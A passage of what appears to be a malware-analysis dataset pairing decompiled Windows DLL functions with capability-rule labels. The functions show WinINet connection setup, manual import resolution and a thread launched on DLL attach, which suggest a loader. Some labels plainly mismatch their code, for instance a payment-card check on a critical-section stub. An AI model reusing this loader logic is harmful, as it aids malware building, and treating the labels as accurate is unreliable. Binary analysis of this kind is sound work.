(*_sym.imp.WININET.dll_InternetCloseHandle)();\n            *0x18001fa10 = 0;\n        }\n        if (*0x18001fa08 != 0) {\n            (*_sym.imp.WININET.dll_InternetCloseHandle)();\n            *0x18001fa08 = 0;\n        }\n        (*_sym.imp.WININET.dll_DeleteUrlCacheEntryW)(arg2);\n        iVar3 = (*_sym.imp.urlmon.dll_ObtainUserAgentString)(0, acStack1368, auStack1380);\n        if (iVar3 != 0) {\n            fcn.1800054f4(auStack1096, 0x104, L\"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\");\n        }\n        iVar5 = -1;\n        do {\n            iVar2 = iVar5 + 1;\n            iVar5 = iVar5 + 1;\n        } while (acStack1368[iVar2] != '\\0');\n        uStack1520 = 0;\n        puStack1528 = NULL;\n        uStack1520 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, acStack1368);\n        iVar5 = -1;\n        do {\n            iVar2 = iVar5 + 1;\n            iVar5 = iVar5 + 1;\n        } while (acStack1368[iVar2] != '\\0');\n        puStack1528 = auStack1096;\n        auStack1380[0] = uStack1520;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, acStack1368);\n        if (0x207 < auStack1380[0] * 2) {\n            fcn.18000356c();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        auStack1096[auStack1380[0]] = 0;\n        auStack1496 = CONCAT124(auStack1496._4_12_, 0x68);\n        auStack1480 = CONCAT88(auStack568, auStack1480._0_8_);\n        auStack1432 = CONCAT88(0x18001fa44, auStack1432._0_8_);\n        _auStack1464 = CONCAT124(auStack1460, 0x104);\n        auStack1416 = CONCAT124(auStack1416._4_12_, 0x104);\n        uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg2);\n        iVar3 = (*_sym.imp.WININET.dll_InternetCrackUrlW)(arg2, uVar4, 0, auStack1496);\n        if (iVar3 != 0) {\n            *0x18001fa20 = auStack1480._4_4_;\n            do {\n                iVar7 = iVar7 + 1;\n            } while (*(arg3 + iVar7 * 2) != 0);\n            puStack1528 = puStack1528 & 0xffffffff00000000;\n            if (iVar7 == 0) {\n                arg3 = 0;\n                uVar6 = 0;\n            }\n            else {\n                uVar6 = 3;\n            }\n            *0x18001fa08 = (*_sym.imp.WININET.dll_InternetOpenW)(auStack1096, uVar6, arg3);\n            if (*0x18001fa08 == 0) {\n                if (*0x18001fa18 != 0) {\n                    (*_sym.imp.WININET.dll_InternetCloseHandle)();\n                    *0x18001fa18 = 0;\n                }\n            }\n            else {\n                uStack1384 = 30000;\n                (*_sym.imp.WININET.dll_InternetSetOptionW)(*0x18001fa08, 2, &uStack1384);\n                uStack1384 = 180000;\n                (*_sym.imp.WININET.dll_InternetSetOptionW)(*0x18001fa08, 5, &uStack1384);\n                uStack1384 = 180000;\n                (*_sym.imp.WININET.dll_InternetSetOptionW)(*0x18001fa08, 6, &uStack1384);\n                uStack1504 = 0;\n                uStack1512 = 0;\n                uStack1520 = 3;\n                puStack1528 = NULL;\n                *0x18001fa10 = (*_sym.imp.WININET.dll_InternetConnectW)(*0x18001fa08, auStack568, auStack1460._0_2_, 0);\n                if (*0x18001fa10 != 0) goto code_r0x000180002c1b;\n                if (*0x18001fa18 != 0) {\n                    (*_sym.imp.WININET.dll_InternetCloseHandle)();\n                    *0x18001fa18 = 0;\n                }\n            }\n            if (*0x18001fa10 != 0) {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa10);\n                *0x18001fa10 = 0;\n            }\n            if (*0x18001fa08 != 0) {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)();\n                *0x18001fa08 = 0;\n            }\n        }\n    }\ncode_r0x000180002c1b:\n    fcn.1800030c0(uStack40 ^ auStack1560);\n    return;\n}\n",
        "token_count": 1817
    },
    "18000a36": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a368(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018000a36c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "18000a37": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a374(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018000a378. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "180001ed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180001ed0(int64_t *arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uchar auVar3 [16];\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    ulong arg2;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t *puVar11;\n    uint32_t *puVar12;\n    \n    iVar2 = arg1[1];\n    if (*(*arg1 + 0x94) == 0) {\n        return 1;\n    }\n    puVar12 = *(*arg1 + 0x90) + iVar2;\n    iVar4 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(puVar12, 0x14);\n    if (iVar4 == 0) {\n        while( true ) {\n            if (puVar12[3] == 0) {\n                return 1;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(puVar12[3] + iVar2);\n            if (iVar6 == -1) break;\n            auVar3 = ZEXT816(8) * ZEXT816(*(arg1 + 3) + 1);\n            arg2 = SUB168(auVar3, 0);\n            if (SUB168(auVar3 >> 0x40, 0) != 0) {\n                arg2 = 0xffffffffffffffff;\n            }\n            iVar7 = fcn.180006c84(arg1[2], arg2);\n            arg1[2] = iVar7;\n            if (iVar7 == 0) {\n                return 0;\n            }\n            *(iVar7 + *(arg1 + 3) * 8) = iVar6;\n            *(arg1 + 3) = *(arg1 + 3) + 1;\n            uVar8 = *puVar12;\n            if (uVar8 == 0) {\n                uVar8 = puVar12[4];\n                uVar5 = uVar8;\n            }\n            else {\n                uVar5 = puVar12[4];\n            }\n            piVar10 = uVar5 + iVar2;\n            puVar11 = uVar8 + iVar2;\n            uVar9 = *puVar11;\n            while (uVar9 != 0) {\n                if (uVar9 < 0) {\n                    uVar9 = uVar9 & 0xffff;\n                }\n                else {\n                    uVar9 = iVar2 + 2 + uVar9;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, uVar9);\n                *piVar10 = iVar7;\n                if (iVar7 == 0) {\n                    return 0;\n                }\n                puVar1 = puVar11 + 1;\n                puVar11 = puVar11 + 1;\n                piVar10 = piVar10 + 1;\n                uVar9 = *puVar1;\n            }\n            puVar12 = puVar12 + 5;\n            iVar4 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(puVar12, 0x14);\n            if (iVar4 != 0) {\n                return 1;\n            }\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 746
    },
    "18000306": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180003060(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    if (arg2 == 1) {\n        *0x180020e68 = arg1;\n        if (arg3 != 0) {\n            fcn.1800054f4(0x180022410, 0x104, arg3);\n        }\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x180001760, 0, 0, 0);\n    }\n    return 1;\n}\n",
        "token_count": 123
    },
    "180005d3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180005d30(int64_t arg1)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    \n    cVar4 = fcn.180005da4(arg1);\n    if (cVar4 == '\\0') {\n        puVar5 = fcn.18000528c();\n        *puVar5 = 0x16;\n        uVar6 = fcn.18000516c();\n        uVar6 = uVar6 & 0xffffffffffffff00;\n    }\n    else {\n        iVar2 = *(arg1 + 0x468);\n        uVar1 = *(arg1 + 0x41);\n        iVar3 = *(iVar2 + 8);\n        if (*(iVar2 + 0x10) == iVar3) {\n            if (*(iVar2 + 0x18) == '\\0') {\n                *(arg1 + 0x28) = 0xffffffff;\n            }\n            else {\n                *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            *(iVar2 + 0x10) = *(iVar2 + 0x10) + 1;\n            ***(arg1 + 0x468) = uVar1;\n            **(arg1 + 0x468) = **(arg1 + 0x468) + 1;\n        }\n        uVar6 = CONCAT71(iVar3 >> 8, 1);\n    }\n    return uVar6;\n}\n",
        "token_count": 382
    },
    "180005e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180005e4c(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    uint8_t *arg1_00;\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint64_t in_RAX;\n    uint *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    ulong uVar9;\n    ushort *arg2;\n    uchar uVar10;\n    uint32_t uVar11;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    uVar1 = arg1[0x41];\n    pcVar8 = in_RAX & 0xffffffffffffff00;\n    if (uVar1 != 0x46) {\n        if (uVar1 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x000180005fb2;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar1 == 0x49) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar2 = *pcVar4;\n                if ((cVar2 == '3') && (pcVar4[1] == '2')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 == '6') && (pcVar4[1] == '4')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 + 0xa8U < 0x21) && ((0x120821001U >> (cVar2 + 0xa8U & 0x3f) & 1) != 0)) {\n                    *(arg1 + 0x3c) = 9;\n                }\n            }\n            else if (uVar1 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar1 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar1 == 0x68) {\n                    if (**(arg1 + 0x18) == 'h') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x1;\n                    }\n                    else {\n                        pcVar8 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar1 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x000180005fb2;\n                    }\n                    if (uVar1 != 0x6c) {\n                        if (uVar1 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar1 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar1 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x000180005fb2;\n                    }\n                    if (**(arg1 + 0x18) == 'l') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x4;\n                    }\n                    else {\n                        pcVar8 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = pcVar8;\n            }\ncode_r0x000180005fb2:\n            return CONCAT71(pcVar8 >> 8, 1);\n        }\n        puVar6 = fcn.18000528c();\n        *puVar6 = 0x16;\n        uVar7 = fcn.18000516c();\n        return uVar7 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x000180005fb2;\n    *(arg1 + 0x2c) = 7;\n    uVar1 = arg1[0x41];\n    uVar10 = 0x78;\n    if (uVar1 < 'e') {\n        if (uVar1 == 100) {\ncode_r0x0001800060af:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800060b3:\n            uVar9 = 10;\ncode_r0x0001800060bb:\n            pcVar8 = fcn.180006590(arg1, uVar9);\n        }\n        else {\n            if (uVar1 == 0x41) goto code_r0x0001800060c2;\n            if (uVar1 == 0x43) {\ncode_r0x00018000602d:\n                pcVar8 = fcn.1800064c8(arg1);\n            }\n            else {\n                if (uVar1 < 'E') goto code_r0x0001800060cb;\n                if (uVar1 < 'H') goto code_r0x0001800060c2;\n                if (uVar1 == 0x53) {\ncode_r0x00018000606b:\n                    pcVar8 = fcn.180006798(arg1);\n                }\n                else {\n                    if (uVar1 == 0x58) goto code_r0x000180006080;\n                    if (uVar1 != 0x5a) {\n                        if (uVar1 != 0x61) {\n                            if (uVar1 != 99) goto code_r0x0001800060cb;\n                            goto code_r0x00018000602d;\n                        }\n                        goto code_r0x0001800060c2;\n                    }\n                    pcVar8 = fcn.180006298(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < uVar1) {\n            if (uVar1 == 0x69) goto code_r0x0001800060af;\n            if (uVar1 == 0x6e) {\n                pcVar8 = fcn.180006710(arg1);\n                goto code_r0x0001800060c7;\n            }\n            if (uVar1 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar9 = 8;\n            }\n            else if (uVar1 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x000180006080:\n                uVar9 = 0x10;\n            }\n            else {\n                if (uVar1 == 0x73) goto code_r0x00018000606b;\n                if (uVar1 == 0x75) goto code_r0x0001800060b3;\n                if (uVar1 != 0x78) goto code_r0x0001800060cb;\n                uVar9 = 0x10;\n            }\n            goto code_r0x0001800060bb;\n        }\ncode_r0x0001800060c2:\n        pcVar8 = fcn.18000630c(arg1);\n    }\ncode_r0x0001800060c7:\n    if (pcVar8 == '\\0') {\ncode_r0x0001800060cb:\n        return pcVar8 & 0xffffffffffffff00;\n    }\n    if (arg1[0x40] != 0) goto code_r0x000180006206;\n    uVar3 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar3 >> 4 & 1) != 0) {\n        if ((uVar3 >> 6 & 1) == 0) {\n            if ((uVar3 & 1) == 0) {\n                if ((uVar3 >> 1 & 1) == 0) goto code_r0x000180006124;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x000180006124:\n    uVar1 = arg1[0x41];\n    if (((uVar1 + 0xa8 & 0xdf) == 0) && ((uVar3 >> 5 & 1) != 0)) {\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\n    }\n    if ((bVar5) || ((uVar1 + 0xbf & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((uVar1 == 0x58) || (uVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar11 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar3 & 0xc) == 0) {\n        fcn.1800058e8(arg1_00, CONCAT71(uVar3 >> 8, 0x20), uVar11, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.18000690c(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800058e8(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar11, arg4);\n    }\n    uVar9 = 0;\n    pcVar8 = fcn.180006830(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        pcVar8 = fcn.1800058e8(arg1_00, CONCAT71(uVar9 >> 8, 0x20), uVar11, arg4);\n    }\ncode_r0x000180006206:\n    return pcVar8 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 2564
    },
    "18000659": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180006590(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = fcn.180006230(*(arg1 + 0x3c));\n    if (iVar1 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar1 != 8) {\n            puVar2 = fcn.18000528c();\n            *puVar2 = 0x16;\n            uVar3 = fcn.18000516c();\n            return uVar3 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar3 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar4 = uVar4 | 0x40;\n        *(arg1 + 0x30) = uVar4;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar4 & 0xfffffff7;\n        fcn.180005728(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 0;\n    if (iVar1 == 8) {\n        fcn.180005858(arg1, uVar3, arg2);\n    }\n    else {\n        fcn.1800057d0(arg1, uVar3 & 0xffffffff, arg2);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 7 & 1) != 0) && ((*(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != '0')))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -1;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar4 >> 0xf, 1);\n}\n",
        "token_count": 917
    },
    "18000709": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180006f49)\n// WARNING: Removing unreachable block (ram,0x000180006f56)\n// WARNING: Removing unreachable block (ram,0x000180006f60)\n// WARNING: Removing unreachable block (ram,0x000180006f6f)\n// WARNING: Removing unreachable block (ram,0x000180006f7a)\n// WARNING: Removing unreachable block (ram,0x000180006f83)\n// WARNING: Removing unreachable block (ram,0x000180006f8c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180007098(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    uint *var_20h;\n    int32_t *var_bp_18h;\n    ulong *var_bp_10h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = auStackX16;\n    var_28h._0_1_ = 0;\n    var_bp_18h = aiStackX24;\n    var_bp_10h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.180006e24(var_30h, &var_2ch + 4, &var_20h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.180006fe8(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "180007bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180007bc0(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x180015a50;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x1800143f0)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x180015b50);\n    if (piVar3 == 0x180015b50) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x180015a50) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x1800143f0)(0);\n                }\n                bVar4 = piVar3 != 0x180015a58;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 273
    },
    "180008fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180008fbc(uint16_t *arg1, uint8_t *arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int64_t iStack40;\n    int64_t aiStack32 [2];\n    char cStack16;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        *0x180020578 = 0;\n        return 0;\n    }\n    if (*arg2 == 0) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        *arg1 = 0;\n        return 0;\n    }\n    fcn.1800052f0(&iStack40, 0);\n    if (*(aiStack32[0] + 0xc) == 0xfde9) {\n        iVar1 = fcn.18000d924(arg1);\n        if (iVar1 < 0) {\n            iVar1 = -1;\n        }\n        goto code_r0x000180008ed9;\n    }\n    if (*(aiStack32[0] + 0x138) == 0) {\n        if (arg1 != NULL) {\n            *arg1 = *arg2;\n        }\ncode_r0x000180008ed4:\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = fcn.180008860(*arg2, aiStack32);\n        if (iVar1 == 0) {\n            iVar1 = fcn.18000c588(*(aiStack32[0] + 0xc), 9);\n            if (iVar1 != 0) goto code_r0x000180008ed4;\n        }\n        else if ((((1 < *(aiStack32[0] + 8)) && (*(aiStack32[0] + 8) <= arg3)) &&\n                 (iVar1 = fcn.18000c588(*(aiStack32[0] + 0xc), 9),  iVar1 != 0)) ||\n                ((*(aiStack32[0] + 8) <= arg3 && (arg2[1] != 0)))) {\n            iVar1 = *(aiStack32[0] + 8);\n            goto code_r0x000180008ed9;\n        }\n        puVar2 = fcn.18000528c();\n        iVar1 = -1;\n        *puVar2 = 0x2a;\n    }\ncode_r0x000180008ed9:\n    if (cStack16 != '\\0') {\n        *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        return iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 597
    },
    "180009e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.180009e8c(uint64_t *arg1, uchar *arg2, uint64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int64_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    uchar auStack24 [16];\n    \n    if ((((arg2 == NULL) || (arg3 == 0)) || (arg4 == 0)) || (in_stack_00000028 == 0)) {\n        puVar3 = fcn.18000528c();\n        *puVar3 = 0x16;\n        fcn.18000516c();\n        return 0x16;\n    }\n    if ((in_stack_00000030 == 0x41) || (in_stack_00000030 - 0x45U < 3)) {\n        uVar8 = 1;\n    }\n    else {\n        uVar8 = 0;\n    }\n    if (((in_stack_00000040 & 8) == 0) && (uVar6 = *arg1,  (uVar6 >> 0x34 & 0x7ff) == 0x7ff)) {\n        if ((uVar6 & 0xfffffffffffff) == 0) {\n            iVar5 = 0;\n        }\n        else if ((uVar6 < 0) && ((uVar6 & 0xfffffffffffff) == 0x8000000000000)) {\n            iVar5 = 0xc;\n        }\n        else {\n            iVar5 = (-((uVar6 & 0x8000000000000) != 0) & 0xfffffffffffffffc) + 8;\n        }\n        if (arg3 < 4U - (uVar6 >> 0x3f)) {\n            *arg2 = 0;\n            return 0xc;\n        }\n        uVar7 = 0xffffffffffffffff;\n        if (uVar6 < 0) {\n            *arg2 = 0x2d;\n            arg2 = arg2 + 1;\n            *arg2 = 0;\n            if (arg3 != 0xffffffffffffffff) {\n                arg3 = arg3 - 1;\n            }\n        }\n        uVar8 = (uVar8 ^ 1) * 2;\n        do {\n            uVar7 = uVar7 + 1;\n        } while (*(*((uVar8 + iVar5) * 8 + 0x1800161d0) + uVar7) != '\\0');\n        iVar2 = fcn.180007d5c(arg2, arg3, *((uVar8 + (arg3 <= uVar7) + iVar5) * 8 + 0x1800161d0));\n        if (iVar2 == 0) {\n            return 0;\n        }\n        fcn.18000518c(0, 0, 0, 0, 0);\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    if (in_stack_00000030 == 0x41) {\ncode_r0x00018000a155:\n        uVar4 = fcn.180009488(arg1, arg2, arg3, arg4);\n    }\n    else {\n        if (in_stack_00000030 == 0x45) {\ncode_r0x00018000a118:\n            uVar4 = fcn.180009808(arg1, arg2, arg3);\n            return uVar4;\n        }\n        if (in_stack_00000030 == 0x46) {\ncode_r0x00018000a082:\n            auStack24 = ZEXT816(0);\n            fcn.18000e0fc(*arg1, in_stack_00000038, auStack24, arg4);\n            uVar6 = arg3 - (auStack24._0_4_ == 0x2d);\n            if (arg3 == 0xffffffffffffffff) {\n                uVar6 = arg3;\n            }\n            uVar4 = fcn.18000db8c(arg2 + (auStack24._0_4_ == 0x2d), uVar6, auStack24._4_4_ + in_stack_00000038, \n                                  auStack24);\n            if (uVar4 != 0) {\n                *arg2 = 0;\n                return uVar4;\n            }\n            uVar4 = fcn.180009acc(arg2, arg3, in_stack_00000038, auStack24);\n            return uVar4;\n        }\n        if (in_stack_00000030 != 0x47) {\n            if (in_stack_00000030 == 0x61) goto code_r0x00018000a155;\n            if (in_stack_00000030 == 0x65) goto code_r0x00018000a118;\n            if (in_stack_00000030 == 0x66) goto code_r0x00018000a082;\n        }\n        uVar4 = fcn.180009c34(arg1, arg2, arg3, arg4);\n    }\n    return uVar4;\n}\n",
        "token_count": 1219
    },
    "18000cf8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
